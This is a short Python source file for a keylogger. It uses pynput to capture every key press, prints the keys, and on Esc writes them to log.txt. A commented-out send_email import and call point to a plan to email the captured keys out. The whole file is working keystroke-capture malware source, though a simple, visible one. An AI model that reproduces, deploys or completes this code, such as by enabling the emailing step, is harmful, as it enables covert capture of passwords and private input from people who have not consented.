from pynput.keyboard import Key, Listener
import time
import re
# import send_email


class KeyLogger():
    def __init__(self):
        self.key_pressed = []
        self.start = time.time()
        self.status = 1
        try:
            with Listener(on_press=self.__on_press, on_release=self.__on_release) as listener:
                listener.join()
        except Exception as E:
            try:
                with open('KLErrorLog.txt', 'a') as file:
                    file.write('\n')
                    file.write(str(E))
            except:
                with open('KLErrorLog.txt', 'w') as file:
                    file.write('\n')
                    file.write(str(E))            


    def __on_press(self, key):
        self.key_pressed.append(str(key))
        self.end = time.time()
        print(self.key_pressed)
        # if self.end-self.start > 3:
        #     self.__update_log()
        #     self.status = 0
        #     # print(self.key_pressed)
        #     self.key_pressed = []
        #     self.start = time.time()

    def __update_log(self):
        if self.status:
            mode = 'w'
        else:
            mode = 'a'
        try:
            with open('log.txt', mode=mode) as file:
                file.writelines(self.key_pressed)
        except Exception as E:
            try:
                with open('KLErrorLog.txt', 'a') as file:
                    file.write('\n')
                    file.write(str(E))
            except:
                with open('KLErrorLog.txt', 'w') as file:
                    file.write('\n')
                    file.write(str(E))

    def __on_release(self, key):
        if key == Key.esc:
            self.__update_log()
            # send_email.send_email()
            return False

k = KeyLogger()